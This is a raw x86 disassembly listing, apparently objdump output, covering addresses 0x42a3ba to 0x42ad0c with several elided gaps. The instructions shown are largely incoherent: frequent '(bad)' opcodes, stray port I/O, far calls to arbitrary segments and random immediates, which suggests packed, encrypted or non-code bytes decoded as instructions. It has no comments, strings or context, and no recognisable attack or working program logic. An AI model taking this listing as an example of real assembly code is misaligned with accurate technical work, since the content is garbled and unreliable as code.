  42a3ba:	aad    0x50
  42a3bc:	test   al,0xda
  42a3be:	jno    0x42a39a
  42a3c0:	mov    bh,0x58
  42a3c2:	xlat   BYTE PTR ds:[ebx]
  42a3c3:	inc    ebp
  42a3c4:	mov    esp,0xbe8833fd
  42a3c9:	pop    esi
  42a3ca:	inc    ebx
  42a3cb:	dec    ebp
  42a3cc:	fwait
  42a3cd:	pop    esi
  42a3ce:	xchg   esi,ebp
  42a3d0:	cmp    al,0x3
  42a3d2:	js     0x42a3ce
  42a3d4:	inc    edi
  42a3d5:	mov    bl,0x4
  42a3d7:	ret    
  42a3d8:	adc    BYTE PTR [eax],bl
  42a3da:	dec    esi
  42a3db:	clc    
  42a3dc:	scas   eax,DWORD PTR es:[edi]
  42a3dd:	sub    eax,0x1933ff4b
  42a3e2:	push   ss
  42a3e3:	addr16 (bad) 
  42a3e5:	pop    edx
  42a3e6:	test   DWORD PTR [ebp-0x3e1a8adf],0xddcc0bd
  42a3f0:	call   0x6fff:0xc2ecc8d1
  42a3f7:	push   edi
  42a3f8:	push   edx
  42a3f9:	cmp    DWORD PTR [ebp+0x28dbac59],eax
  42a3ff:	sbb    DWORD PTR [ebx],0x42b1633d
  42a405:	pop    eax
  42a406:	aad    0xc5
  42a408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a409:	fwait
  42a40a:	mov    al,0x49
  42a40c:	fbld   TBYTE PTR [esi]
  42a40e:	xor    al,0xc8
  42a410:	xchg   ebx,eax
  42a411:	xchg   edi,eax
  42a412:	cmc    
  42a413:	cld    
  42a414:	lods   eax,DWORD PTR ds:[esi]
  42a415:	push   ebx
  42a416:	sti    
  42a417:	bound  edi,QWORD PTR [ebp+0x38]
  42a41a:	xchg   DWORD PTR [eax],esp
  42a41c:	es dec edi
  42a41e:	test   BYTE PTR ds:0x89dd3520,0xc6
  42a425:	or     eax,0x65982b46
  42a42a:	xor    DWORD PTR [ebx],ebx
  42a42c:	(bad)  [ebx+ebp*2]
  42a42f:	(bad)  
  42a430:	pop    ecx
  42a431:	push   ecx
  42a432:	xchg   ecx,eax
  42a433:	or     dl,al
  42a435:	pop    ss
  42a436:	bound  edi,QWORD PTR [ebx+0x2e64097d]
  42a43c:	sbb    dl,BYTE PTR [edx-0x69d4cf0f]
  42a442:	jge    0x42a416
  42a444:	inc    esi
  42a445:	ror    esi,1
  42a447:	jge    0x42a496
  42a449:	push   edx
  42a44a:	ret    0xb70d
  42a44d:	repz inc ebp
  42a44f:	xchg   BYTE PTR [eax-0x1b],bh
  42a452:	add    edx,DWORD PTR [ebp-0x2f]
  42a455:	xchg   esi,eax
  42a456:	or     DWORD PTR [edi-0x73],0xe36fe250
  42a45d:	stos   DWORD PTR es:[edi],eax
  42a45e:	adc    esp,DWORD PTR [edx]
  42a460:	xchg   esp,eax
  42a461:	in     al,dx
  42a462:	aam    0xfa
  42a464:	loope  0x42a455
  42a466:	sub    esp,DWORD PTR [edx]
  42a468:	sub    al,0xf4
  42a46a:	nop
  42a46b:	dec    esi
  42a46c:	jno    0x42a467
  42a46e:	sbb    ebp,eax
  42a470:	mov    dl,0x17
  42a472:	cmp    eax,0xf202cf8b
  42a477:	das    
  42a478:	jp     0x42a416
  42a47a:	pop    edi
  42a47b:	lods   eax,DWORD PTR ds:[esi]
  42a47c:	ins    BYTE PTR es:[edi],dx
  42a47d:	cld    
  42a47e:	sbb    eax,0xd82f5a4a
  42a483:	inc    eax
  42a484:	ins    BYTE PTR es:[edi],dx
  42a485:	pop    ecx
  42a486:	pop    ebp
  42a487:	mov    esi,0x886a25d3
  42a48c:	inc    esi
  42a48d:	ror    DWORD PTR [edx+0x50],cl
  42a490:	xor    al,0xf1
  42a492:	mov    ebp,edx
  42a494:	call   0x9054:0xb8ccb87d
  42a49b:	jg     0x42a4f2
  42a49d:	pop    esp
  42a49e:	clc    
  42a49f:	popf   
  42a4a0:	lahf   
  42a4a1:	ins    BYTE PTR es:[edi],dx
  42a4a2:	rcl    DWORD PTR [edi-0x6f],0x9f
  42a4a6:	jnp    0x42a4d2
  42a4a8:	add    ecx,DWORD PTR [edi-0x5]
  42a4ab:	lahf   
  42a4ac:	or     ebp,DWORD PTR [edx]
  42a4ae:	(bad)  
  42a4b0:	int3   
  42a4b1:	push   ebx
  42a4b2:	jae    0x42a50b
  42a4b4:	popa   
	...
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    bh,bh
  42a523:	stos   BYTE PTR es:[edi],al
  42a524:	dec    edx
  42a525:	xchg   esp,eax
  42a526:	jbe    0x42a4ec
  42a528:	add    DWORD PTR [eax],eax
  42a52a:	pop    es
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR [esi+0xf],bh
  42a530:	jbe    0x42a53c
  42a532:	pusha  
  42a533:	fwait
  42a534:	retf   
  42a535:	jge    0x42a53e
  42a537:	adc    cl,BYTE PTR [edi+0x41]
  42a53a:	push   0xffffffc5
  42a53c:	sbb    eax,0x20247d2e
  42a541:	kmovd  ebx,k6
  42a545:	fiadd  WORD PTR [edi+0x53]
  42a548:	or     BYTE PTR ds:0xb2853a04,0x40
  42a54f:	inc    ecx
  42a550:	in     al,dx
  42a551:	push   cs
  42a552:	or     BYTE PTR [eax-0x58fdc3da],cl
  42a558:	push   esi
  42a559:	fmulp  st(7),st
  42a55b:	mov    edi,0x6df65ef
  42a560:	loope  0x42a5c9
  42a562:	outs   dx,BYTE PTR ds:[esi]
  42a563:	lahf   
  42a564:	scas   eax,DWORD PTR es:[edi]
  42a565:	into   
  42a566:	jle    0x42a533
  42a568:	es stos DWORD PTR es:[edi],eax
  42a56a:	jmp    0x42a53a
  42a56c:	and    ebp,DWORD PTR [ebp+0x503a3aa0]
  42a572:	retf   
  42a573:	enter  0x5bfb,0xee
  42a577:	push   ebx
  42a578:	mov    esp,0x79589c11
  42a57d:	mov    dl,0x5
  42a57f:	jmp    0x42a51a
  42a581:	adc    bh,ah
  42a583:	sbb    ch,bl
  42a585:	push   cs
  42a586:	inc    ebx
  42a587:	lahf   
  42a588:	adc    al,0x9c
  42a58a:	add    bl,BYTE PTR [edi-0x34]
  42a58d:	push   esi
  42a58e:	add    dh,bh
  42a590:	not    ebp
  42a592:	sub    al,0x1f
  42a594:	jae    0x42a5aa
  42a596:	int3   
  42a597:	lods   al,BYTE PTR ds:[esi]
  42a598:	es jo  0x42a61a
  42a59b:	jg     0x42a551
  42a59d:	into   
  42a59e:	aas    
  42a59f:	xchg   BYTE PTR [ebx],dh
  42a5a1:	push   ebp
  42a5a2:	cwde   
  42a5a3:	aam    0x82
  42a5a5:	dec    edi
  42a5a6:	sub    ah,BYTE PTR [ebx]
  42a5a8:	pusha  
  42a5a9:	and    edi,esp
  42a5ab:	out    0x28,al
  42a5ad:	mov    edx,esi
  42a5af:	adc    al,0xf9
  42a5b1:	outs   dx,DWORD PTR ds:[esi]
  42a5b2:	mov    bh,0x85
  42a5b4:	mov    ah,0x76
  42a5b6:	lods   eax,DWORD PTR ds:[esi]
  42a5b7:	fadd   QWORD PTR [ecx+0x1b7d3ead]
  42a5bd:	call   FWORD PTR [edi+0x16]
  42a5c0:	adc    BYTE PTR [eax-0x16e35135],ah
  42a5c6:	mov    ah,0xee
  42a5c8:	sub    edx,DWORD PTR cs:[edi+0x6]
  42a5cc:	jg     0x42a62c
  42a5ce:	sub    BYTE PTR [edi*2-0x72d247a4],ch
  42a5d5:	pop    eax
  42a5d6:	ss arpl WORD PTR gs:[ecx],dx
  42a5da:	popa   
  42a5db:	int3   
  42a5dc:	xor    DWORD PTR [ecx+eax*2+0x37],0x27
  42a5e1:	fadd   st(7),st
  42a5e3:	adc    BYTE PTR [edi+0x6b342bfe],ah
  42a5e9:	imul   ah
  42a5eb:	fs inc edi
  42a5ed:	ret    
  42a5ee:	mov    WORD PTR [esi+eiz*4-0x1c],?
  42a5f2:	cmp    ah,ch
  42a5f4:	inc    esi
  42a5f5:	ret    
  42a5f6:	mov    al,ds:0x4c2f566e
  42a5fb:	ret    
  42a5fc:	push   esi
  42a5fd:	jb     0x42a611
  42a5ff:	jbe    0x42a5a3
  42a601:	dec    eax
  42a602:	push   ebp
  42a603:	add    al,0x56
  42a605:	aad    0x10
  42a607:	mov    ebp,0x28be8e7d
  42a60c:	xor    cl,BYTE PTR [ecx-0x5a8b3642]
  42a612:	jnp    0x42a66c
  42a614:	mov    bl,0xe3
  42a616:	sbb    al,0xbe
  42a618:	inc    eax
  42a619:	mov    edx,ebx
  42a61b:	jle    0x42a5e7
  42a61d:	mov    BYTE PTR [eax-0x33],al
  42a620:	(bad)  
  42a621:	ins    DWORD PTR es:[edi],dx
  42a622:	fadd   st(1),st
  42a624:	std    
  42a625:	(bad)  
  42a626:	fdivr  DWORD PTR [esi+0x79]
  42a629:	fmul   QWORD PTR [ebp-0x39]
  42a62c:	rcr    edi,1
  42a62e:	xlat   BYTE PTR ds:[bx]
  42a630:	(bad)  
  42a631:	or     BYTE PTR [ecx+0x8402],bl
	...
  42a693:	add    BYTE PTR [eax],al
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x8467323b
  42a6a3:	out    dx,al
  42a6a4:	mov    WORD PTR ds:0x1c57d,ss
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    al,dl
  42a6af:	rcl    BYTE PTR [esi],cl
  42a6b1:	ss mov al,0x5
  42a6b4:	fiadd  DWORD PTR [edi-0x36]
  42a6b8:	and    ebx,DWORD PTR ds:0x2140af2b
  42a6be:	aas    
  42a6bf:	sbb    bh,BYTE PTR [ecx-0x666c01a]
  42a6c5:	clc    
  42a6c6:	push   ecx
  42a6c7:	fiadd  DWORD PTR [eax-0x29d87b9c]
  42a6cd:	icebp  
  42a6ce:	repnz test DWORD PTR [eax],edx
  42a6d1:	mov    ah,BYTE PTR [edx+0x7b]
  42a6d4:	and    dl,cl
  42a6d6:	inc    ecx
  42a6d7:	aaa    
  42a6d8:	jmp    0xf111a159
  42a6dd:	nop
  42a6de:	mov    dl,0xc0
  42a6e0:	pop    es
  42a6e1:	pop    edx
  42a6e2:	(bad)  
  42a6e3:	mov    bh,0xf5
  42a6e5:	inc    eax
  42a6e6:	mov    ebp,0xc5c51608
  42a6eb:	fist   DWORD PTR [ebx+0x4]
  42a6ee:	inc    edi
  42a6ef:	add    al,ch
  42a6f1:	xchg   ecx,eax
  42a6f2:	out    0xe5,al
  42a6f4:	xor    ebp,edx
  42a6f6:	xchg   DWORD PTR [esi-0x68],esi
  42a6f9:	pop    ebx
  42a6fa:	mov    ah,0x37
  42a6fc:	sbb    al,0x91
  42a6fe:	pop    ecx
  42a6ff:	cmp    dh,BYTE PTR [esi-0x7]
  42a702:	(bad)  
  42a703:	out    0xf7,eax
  42a705:	jmp    0x42a6ff
  42a707:	push   eax
  42a708:	adc    al,0xa6
  42a70a:	xor    BYTE PTR [ebx+0x71],0x14
  42a70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a70f:	jns    0x42a6ec
  42a711:	xchg   esi,eax
  42a712:	xchg   ecx,eax
  42a713:	(bad)  
  42a714:	adc    dl,bh
  42a716:	adc    edi,edx
  42a718:	(bad)  
  42a719:	out    0xcd,al
  42a71b:	(bad)  
  42a71c:	rcr    DWORD PTR [edi],1
  42a71e:	pop    ds
  42a71f:	push   es
  42a720:	push   DWORD PTR [ebx+eax*4+0x6d6196f3]
  42a727:	in     al,0x39
  42a729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a72a:	aaa    
  42a72b:	aaa    
  42a72c:	iret   
  42a72d:	and    bh,cl
  42a72f:	dec    edx
  42a730:	jno    0x42a767
  42a732:	xchg   ecx,eax
  42a733:	gs xchg edi,eax
  42a735:	fucomp st(4)
  42a737:	xor    eax,0xfe9154cb
  42a73c:	dec    edx
  42a73d:	je     0x42a70f
  42a73f:	cmp    ch,bl
  42a741:	ret    0x3b06
  42a744:	not    al
  42a746:	cs mov dl,0xf3
  42a749:	adc    BYTE PTR [eax+0x6bc2356c],bh
  42a74f:	and    al,0x3
  42a751:	sbb    cl,BYTE PTR [edi+0x65b00b70]
  42a757:	mov    dh,BYTE PTR [esp+edi*1+0x4b]
  42a75b:	cld    
  42a75c:	sbb    al,0x35
  42a75e:	ret    
  42a75f:	adc    dl,0xe0
  42a762:	cwde   
  42a763:	popa   
  42a764:	fwait
  42a765:	leave  
  42a766:	add    eax,0x6cf45644
  42a76b:	jnp    0x42a7aa
  42a76d:	mov    ecx,0xaa500b1b
  42a772:	mov    ds:0x836f624e,al
  42a777:	(bad)  
  42a778:	cmp    BYTE PTR [esi+0x46],ah
  42a77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a77c:	(bad)  
  42a77d:	pop    esp
  42a77e:	or     cl,BYTE PTR [edi]
  42a780:	xor    edx,DWORD PTR [ebx]
  42a782:	ret    0x1dd
  42a785:	sub    eax,0x3bf22b20
  42a78a:	jl     0x42a74c
  42a78c:	mov    ebp,0x42732b6c
  42a791:	sub    DWORD PTR [esi-0x79],ebx
  42a794:	ret    
  42a795:	add    eax,0xc93ec21d
  42a79a:	aaa    
  42a79b:	add    DWORD PTR [eax],esi
  42a79d:	inc    edx
  42a79e:	xchg   esi,eax
  42a79f:	or     cl,bh
  42a7a1:	in     al,dx
  42a7a2:	mov    ebp,DWORD PTR [edx-0x1015b73]
  42a7a8:	or     BYTE PTR [ebx+0x42],al
  42a7ab:	jmp    0x450f:0x83e9af39
  42a7b2:	neg    DWORD PTR [eax+edx*4+0x0]
	...
  42a815:	add    BYTE PTR [edx-0x10409c9b],cl
  42a81b:	mov    edi,0x497a75de
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	ds push es
  42a824:	sub    DWORD PTR [esi],edi
  42a826:	test   dh,al
  42a828:	add    DWORD PTR [eax],eax
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [eax+ecx*1+0x186036bb],dh
  42a834:	pop    esp
  42a835:	jne    0x42a7ff
  42a837:	ror    BYTE PTR [ebp+0x54],cl
  42a83a:	mov    ds:0x1dbbf80,al
  42a83f:	mov    DWORD PTR [edi-0x46],edi
  42a842:	pop    esp
  42a843:	ins    DWORD PTR es:[edi],dx
  42a844:	(bad)
  42a847:	xor    DWORD PTR [edx-0x243c367d],ecx
  42a84d:	dec    ebp
  42a84e:	imul   DWORD PTR [edi]
  42a850:	cmp    DWORD PTR [ebx],ecx
  42a852:	mov    DWORD PTR [eax+0x4559953d],ebx
  42a858:	js     0x42a84c
  42a85a:	jecxz  0x42a8d0
  42a85c:	inc    ebp
  42a85d:	ficomp DWORD PTR [edi+0x9]
  42a860:	push   ecx
  42a861:	sbb    al,0xe2
  42a863:	mov    esp,0xfd310f16
  42a868:	jmp    0x8f93:0xf8703059
  42a86f:	fstp   TBYTE PTR [ecx]
  42a871:	sub    edi,DWORD PTR [ecx+0x1cb1d2be]
  42a877:	stos   DWORD PTR es:[edi],eax
  42a878:	rol    DWORD PTR [eax+0x6d],0xd0
  42a87c:	mov    BYTE PTR [esi-0x42d98064],dh
  42a882:	sti    
  42a883:	in     al,0x25
  42a885:	popa   
  42a886:	int3   
  42a887:	inc    ebx
  42a888:	xchg   edi,eax
  42a889:	mov    WORD PTR [ebp+0x7c],ss
  42a88c:	pop    edx
  42a88d:	hlt    
  42a88e:	mov    eax,ds:0xa047f436
  42a893:	mov    WORD PTR [ebx+0x65],fs
  42a896:	ja     0x42a86a
  42a898:	sub    BYTE PTR [ebx+0x5303e2fb],0x93
  42a89f:	movaps xmm5,XMMWORD PTR [ecx]
  42a8a2:	(bad)  
  42a8a3:	outs   dx,BYTE PTR ds:[esi]
  42a8a4:	pop    edi
  42a8a5:	pop    edx
  42a8a6:	(bad)  
  42a8a7:	mov    esp,0xbbdde940
  42a8ac:	jnp    0x42a89c
  42a8ae:	les    eax,FWORD PTR [ebp-0xf74b558]
  42a8b4:	sub    eax,0xf26aff2c
  42a8b9:	mov    esi,eax
  42a8bb:	out    dx,eax
  42a8bc:	jl     0x42a8c7
  42a8be:	pop    esi
  42a8bf:	mov    WORD PTR [esi],gs
  42a8c1:	cli    
  42a8c2:	sahf   
  42a8c3:	sbb    edx,eax
  42a8c5:	ret    0x9b10
  42a8c8:	les    esi,FWORD PTR [ebx+esi*4-0x52a42bbb]
  42a8cf:	dec    eax
  42a8d1:	sub    edi,ebp
  42a8d3:	outs   dx,BYTE PTR ds:[esi]
  42a8d4:	and    al,0x3e
  42a8d6:	mov    bl,0xdf
  42a8d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8d9:	cwde   
  42a8da:	out    0x1c,al
  42a8dc:	in     al,0x34
  42a8de:	inc    esp
  42a8df:	repnz loop 0x42a8cc
  42a8e2:	pop    esp
  42a8e3:	jge    0x42a8fa
  42a8e5:	sub    eax,0xdd72540a
  42a8ea:	dec    edx
  42a8eb:	in     al,dx
  42a8ec:	mov    eax,0xe497faf1
  42a8f1:	(bad)  [eax-0x27]
  42a8f4:	and    ecx,0x5d21b2f2
  42a8fa:	add    al,al
  42a8fc:	test   BYTE PTR [esi+0x8],al
  42a8ff:	and    BYTE PTR [esi+0xfa6853c],bl
  42a905:	push   ds
  42a906:	mov    dh,0x8a
  42a908:	bound  edi,QWORD PTR [esp]
  42a90b:	pop    ecx
  42a90c:	div    ebx
  42a90e:	out    0x23,eax
  42a910:	not    bl
  42a912:	loope  0x42a929
  42a914:	or     edi,DWORD PTR [edi-0x26e4a694]
  42a91a:	ins    BYTE PTR es:[edi],dx
  42a91b:	push   fs
  42a91d:	pop    esi
  42a91e:	cmp    al,0xe1
  42a920:	pop    edx
  42a921:	test   al,0x37
  42a923:	adc    al,0x3b
  42a925:	mov    esi,0x5481781a
  42a92a:	rcr    dl,cl
  42a92c:	rcr    BYTE PTR [ecx],0x14
  42a92f:	jp     0x42a92f
  42a931:	mov    ecx,0x602355
	...
  42a996:	test   al,0x93
  42a998:	sbb    eax,0xfbee3fee
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     esp,edi
  42a9a3:	inc    esi
  42a9a4:	pop    ecx
  42a9a5:	mov    al,0x8b
  42a9a7:	mov    DWORD PTR [ecx],0x10700
  42a9ad:	add    BYTE PTR [ecx-0x745b1825],dl
  42a9b3:	lods   al,BYTE PTR ds:[esi]
  42a9b4:	add    DWORD PTR [esi+0xb],ebx
  42a9b7:	popa   
  42a9b8:	and    DWORD PTR [edi],esi
  42a9ba:	out    0xaf,eax
  42a9bc:	sub    DWORD PTR [edx],edx
  42a9be:	repnz scas eax,DWORD PTR es:[edi]
  42a9c0:	pop    ds
  42a9c1:	mov    dh,0x57
  42a9c3:	pushf  
  42a9c4:	dec    ebx
  42a9c5:	sar    dl,0x6
  42a9c8:	icebp  
  42a9c9:	sbb    al,0x2f
  42a9cb:	jmp    0xdc00:0xa571266a
  42a9d2:	mov    al,ds:0x1bb72b5a
  42a9d7:	jmp    0x85f984a4
  42a9dc:	scas   al,BYTE PTR es:[edi]
  42a9dd:	mov    bl,0x10
  42a9df:	sar    DWORD PTR [ecx+0x3b],1
  42a9e2:	xchg   DWORD PTR [eax+ebp*8-0x3921eacb],esp
  42a9e9:	sbb    cl,BYTE PTR [edi+0x40]
  42a9ec:	add    ecx,ebx
  42a9ee:	sbb    cl,BYTE PTR [edi+0x0]
  42a9f1:	and    eax,0x7bd6f2db
  42a9f6:	jle    0x42a987
  42a9f8:	ss jno 0x42aa2f
  42a9fb:	test   BYTE PTR [eax-0x21ff4ee],0x22
  42aa02:	sub    eax,0xbe0e4e23
  42aa07:	shr    DWORD PTR [eax-0x49],cl
  42aa0a:	fstp   TBYTE PTR [ecx-0x299efdc7]
  42aa10:	pop    ds
  42aa11:	sub    BYTE PTR [eax],0x91
  42aa14:	xchg   ebp,eax
  42aa15:	je     0x42a9e1
  42aa17:	rcl    ebx,cl
  42aa19:	in     eax,0x76
  42aa1b:	rcr    DWORD PTR ds:0x907b9784,0x9f
  42aa22:	inc    edi
  42aa23:	sbb    BYTE PTR [edx+0x34],dl
  42aa26:	inc    esi
  42aa27:	lds    edi,FWORD PTR [edx+0x69]
  42aa2a:	inc    ecx
  42aa2b:	cmp    esi,ecx
  42aa2d:	jae    0x42aaac
  42aa2f:	sbb    DWORD PTR [edx-0x40],0x27fbf163
  42aa36:	fxtract 
  42aa38:	jns    0x42aa76
  42aa3a:	xor    DWORD PTR [ecx],edx
  42aa3c:	and    al,BYTE PTR [si]
  42aa3f:	inc    edx
  42aa40:	das    
  42aa41:	xchg   dh,ah
  42aa43:	arpl   WORD PTR [ecx-0x512ffe3],cx
  42aa49:	mov    edx,esp
  42aa4b:	data16 cld 
  42aa4d:	xadd   BYTE PTR [ebx],dh
  42aa50:	cmp    al,0xd2
  42aa52:	fisttp DWORD PTR [edi]
  42aa54:	mov    DWORD PTR [edx-0x62bf7f85],ebp
  42aa5a:	mul    DWORD PTR [edi]
  42aa5c:	test   al,0x90
  42aa5e:	fadd   st,st(4)
  42aa60:	cdq    
  42aa61:	mov    eax,0x9b128dc9
  42aa66:	cs sar esi,0x85
  42aa6a:	in     al,dx
  42aa6b:	xor    eax,0xc7b0e49c
  42aa70:	call   0xa09a:0x2c80f153
  42aa77:	sbb    ecx,DWORD PTR [ebp+0x48c28246]
  42aa7d:	mov    al,ds:0xa375239c
  42aa82:	lds    esp,FWORD PTR [esi+edi*1+0x3ffd4d0a]
  42aa89:	cli    
  42aa8a:	ret    
  42aa8b:	adc    al,0x80
  42aa8d:	test   al,0x87
  42aa8f:	test   edx,esp
  42aa91:	and    ah,BYTE PTR [eax+0xd]
  42aa94:	adc    BYTE PTR [ecx],0x6b
  42aa97:	fstp   DWORD PTR [edx-0xbd495f8]
  42aa9d:	cwde   
  42aa9e:	imul   ebp,DWORD PTR [ebx-0x1d],0x51
  42aaa2:	arpl   bx,bp
  42aaa4:	xor    ebx,DWORD PTR [edx+0x612bf979]
  42aaaa:	push   ecx
  42aaab:	cdq    
  42aaac:	jp     0x42aab2
  42aaae:	fbstp  TBYTE PTR [edx]
  42aab0:	cmp    DWORD PTR ds:0xf4424e,ecx
	...
  42ab16:	ds push cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [eax],esi
  42ab23:	or     eax,0xc89215a3
  42ab28:	add    DWORD PTR [eax],eax
  42ab2a:	pop    es
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    bl,bl
  42ab2f:	cmp    al,0x78
  42ab31:	pop    eax
  42ab32:	pop    ebx
  42ab33:	or     BYTE PTR [edi-0x7bc6392],dl
  42ab39:	jp     0x42ab10
  42ab3b:	ds clc 
  42ab3d:	test   eax,0x69262e13
  42ab42:	popa   
  42ab43:	fdiv   DWORD PTR [eax-0xa318bce]
  42ab49:	push   ebx
  42ab4a:	addr16 dec ebp
  42ab4c:	pop    esp
  42ab4d:	test   eax,0x1790efe9
  42ab52:	ficom  WORD PTR [ebp+eiz*1+0x76]
  42ab56:	mov    es,WORD PTR [edx]
  42ab58:	lea    esi,[eax+0x77]
  42ab5b:	je     0x42aaee
  42ab5d:	xchg   esi,eax
  42ab5e:	push   cs
  42ab5f:	sbb    ebp,ebp
  42ab61:	jb     0x42abaa
  42ab63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab64:	inc    ebp
  42ab65:	xor    al,0x4
  42ab67:	or     eax,0xb24c346e
  42ab6c:	sahf   
  42ab6d:	push   ebp
  42ab6e:	dec    eax
  42ab6f:	xor    ah,BYTE PTR [ebx]
  42ab71:	mov    esi,0x77feaf94
  42ab76:	das    
  42ab77:	shr    dh,0x6a
  42ab7a:	xchg   edi,eax
  42ab7b:	inc    ebx
  42ab7c:	ds nop
  42ab7e:	jb     0x42ab03
  42ab80:	(bad)  
  42ab81:	or     edx,ebp
  42ab83:	add    edx,0x4d
  42ab86:	imul   ecx,DWORD PTR [esi+eiz*8-0x7f],0x69ffd288
  42ab8e:	adc    bh,BYTE PTR [ebx-0x8]
  42ab91:	sbb    edx,DWORD PTR [ebp+0x5b]
  42ab94:	adc    DWORD PTR [esi+0x3c],edx
  42ab97:	gs pop es
  42ab99:	fstp   st(4)
  42ab9b:	mov    ah,0x57
  42ab9d:	retf   
  42ab9e:	mov    dh,0xde
  42aba0:	aas    
  42aba1:	rol    DWORD PTR [ebx*1-0x6631fae4],1
  42aba8:	pop    edi
  42aba9:	pop    esi
  42abaa:	fisub  DWORD PTR [eax]
  42abac:	stc    
  42abad:	into   
  42abae:	pop    ebp
  42abaf:	pop    edi
  42abb0:	dec    ecx
  42abb1:	pop    eax
  42abb2:	test   BYTE PTR [edi+0x5b],al
  42abb5:	inc    ebp
  42abb6:	push   edi
  42abb7:	addr16 cld 
  42abb9:	jge    0x42ab59
  42abbb:	(bad)  
  42abbc:	cmp    edx,DWORD PTR [edi-0x2a]
  42abbf:	hlt    
  42abc0:	cmp    ebx,eax
  42abc2:	xchg   ebp,eax
  42abc3:	cmp    al,0x16
  42abc5:	inc    eax
  42abc6:	cdq    
  42abc7:	fcomi  st,st(6)
  42abc9:	and    esi,DWORD PTR [ebx]
  42abcb:	add    DWORD PTR [esi],eax
  42abcd:	ins    DWORD PTR es:[edi],dx
  42abce:	inc    edx
  42abcf:	mov    bh,0x8f
  42abd1:	mov    eax,0xf6d1de29
  42abd6:	lea    edx,[ecx]
  42abd8:	aas    
  42abd9:	mov    ah,0x3
  42abdb:	push   ecx
  42abdc:	inc    edi
  42abdd:	adc    al,0xe
  42abdf:	shr    esp,0xd
  42abe2:	sbb    ah,BYTE PTR ds:[esi-0x3d]
  42abe6:	xchg   DWORD PTR [eax-0x73ff88eb],esp
  42abec:	ins    DWORD PTR es:[edi],dx
  42abed:	mov    ch,0x10
  42abef:	fild   WORD PTR [esi+0x2db63490]
  42abf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abf6:	push   ebp
  42abf7:	push   edx
  42abf8:	ret    0x86b
  42abfb:	xlat   BYTE PTR ds:[ebx]
  42abfc:	loopne 0x42ac34
  42abfe:	popa   
  42abff:	pop    ebx
  42ac00:	ficomp WORD PTR [ecx+0x4a]
  42ac03:	call   0x54c:0xed3ab5b7
  42ac0a:	div    DWORD PTR [ecx]
  42ac0c:	jne    0x42ac69
  42ac0e:	pop    ebx
  42ac0f:	xchg   edi,eax
  42ac10:	data16 shr BYTE PTR [ebx+0x1de2b7b7],cl
  42ac17:	inc    edi
  42ac18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac19:	jne    0x42abf6
  42ac1b:	lahf   
  42ac1c:	in     al,dx
  42ac1d:	popa   
  42ac1e:	(bad)  
  42ac1f:	jmp    0x42abd4
  42ac21:	arpl   WORD PTR [edi],bx
  42ac23:	pop    ss
  42ac24:	fmul   st(5),st
  42ac26:	add    bh,BYTE PTR [ecx-0x3678448e]
  42ac2c:	mov    al,ds:0x2431b33
  42ac31:	icebp  
  42ac32:	imul   esp,DWORD PTR [ebp+0x74],0x0
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x7ba7f5a7],cl
  42aca4:	cmp    al,0x49
  42aca6:	cdq    
  42aca7:	leave  
  42aca8:	add    DWORD PTR [eax],eax
  42acaa:	pop    es
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [ebp+0x1d],dl
  42acb0:	xchg   edx,eax
  42acb1:	jns    0x42ac74
  42acb3:	dec    edx
  42acb4:	popf   
  42acb5:	test   al,dl
  42acb7:	push   ss
  42acb8:	jae    0x42ac91
  42acba:	icebp  
  42acbb:	push   edi
  42acbc:	div    BYTE PTR [esi-0x21]
  42acbf:	xchg   ebp,eax
  42acc0:	fs popf 
  42acc2:	cli    
  42acc3:	inc    edx
  42acc4:	sub    eax,0x82619b92
  42acc9:	(bad)  
  42acca:	cdq    
  42accb:	mov    bh,0x93
  42accd:	(bad)  
  42accf:	lea    edi,[ebp+0x16c9d208]
  42acd5:	or     eax,0x70fc5cfb
  42acda:	xor    edx,ecx
  42acdc:	scas   eax,DWORD PTR es:[edi]
  42acdd:	xchg   esp,eax
  42acde:	jo     0x42ace0
  42ace0:	fs push ecx
  42ace2:	aad    0x91
  42ace4:	scas   al,BYTE PTR es:[edi]
  42ace5:	xchg   ebp,eax
  42ace6:	ret    
  42ace7:	cmp    ebp,DWORD PTR [edx]
  42ace9:	stos   BYTE PTR es:[edi],al
  42acea:	and    eax,0x6100a64b
  42acef:	mov    esp,0xc1bcc156
  42acf4:	jns    0x42acb8
  42acf6:	ds in  eax,dx
  42acf8:	dec    edx
  42acf9:	adc    dl,bh
  42acfb:	mov    dh,0x3a
  42acfd:	mov    bh,0xdc
  42acff:	jg     0x42ad6b
  42ad01:	fadd   QWORD PTR [esi+0x20]
  42ad04:	sub    al,0x73
  42ad06:	mov    ecx,0x85a80f88
  42ad0b:	nop
  42ad0c:	les    ebx,FWORD PTR es:[edi+0x63]
